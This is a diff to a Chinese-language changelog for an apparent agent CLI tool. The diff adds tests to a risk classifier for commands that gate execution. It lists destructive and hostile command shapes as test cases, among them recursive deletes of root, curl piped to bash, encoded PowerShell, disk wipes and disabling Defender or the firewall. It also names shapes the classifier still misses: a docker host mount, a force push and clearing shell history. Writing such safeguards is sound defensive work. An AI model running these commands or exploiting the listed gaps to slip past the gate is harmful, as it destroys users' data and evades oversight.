@@ -20,7 +20,11 @@
    - 破坏性形状判 High，`yes` 买不到。
    issue 里列的绕过例子现在全部 High，并已固化成测试：`rd /s /q C:\Users`、
    `Remove-Item -Recurse -Force C:\`、`rm  -rf  /`（双空格）、`curl https://x | bash`、
-   `powershell -EncodedCommand …`、`reg delete HKLM\…`、`mkfs.ext4`、`dd of=/dev/sda`。
+   `powershell -EncodedCommand …`、`reg delete HKLM\…`、`mkfs.ext4`、`dd of=/dev/sda`、
+   `chmod -R 777 /`，以及关掉防护的 `Set-MpPreference -DisableRealtimeMonitoring` /
+   `netsh advfirewall set … state off`——把保护关掉不是配置改动，是破坏性动作的前一步。
+   分类器读形状不读意图，抓不到的也钉成测试写明（`docker run -v /:/host chroot`、
+   `git push --force`、`history -c` 目前是 Medium：会要求一次决定，但不会被标成高危）。
    包装器 `sudo` / `cmd /c` / `sh -c "…"` 会先剥开再判；反向也不误伤散文
    （`printf "format %s"`、"please format the document" 不再是高危——旧名单里的 `"format "`
    会命中它们，把用户训练成无脑放行）。
@@ -52,9 +56,9 @@ CLI 的 `--yes` 本来就是显式开关，所以上表证的是**分类**与**�
 `yes: true`）由两项新测试与代码锁住；HTTP 模式下"高危没有反向通道"那一格只有单测证据，
 真机端到端跑 `run_task` 需要模型密钥，本机未配置——这一格不算已验证。
 
-另有 15 项新测试：分级 8 项（含 issue 列出的全部绕过例子、包装器剥离、散文反向用例）、
+另有 16 项新测试：分级 9 项（含 issue 列出的全部绕过例子、包装器剥离、散文反向用例、以及把分类器**抓不到**的形状——`docker run -v /:/host chroot`、`git push --force`、`history -c`——钉成 Medium 的边界测试）、
 执行门 5 项（只读免确认 / 未列名需决定 / `yes` 买不到高危 / `allow_high` 生效 / 无通道即拒绝）、
-入口默认 2 项。`cargo test --workspace` **93 通过 / 0 失败**（0.1.4 时 78）。
+入口默认 2 项。`cargo test --workspace` **94 通过 / 0 失败**（0.1.4 时 78）。
 
 ## 0.1.4 — 2026-10-23
 
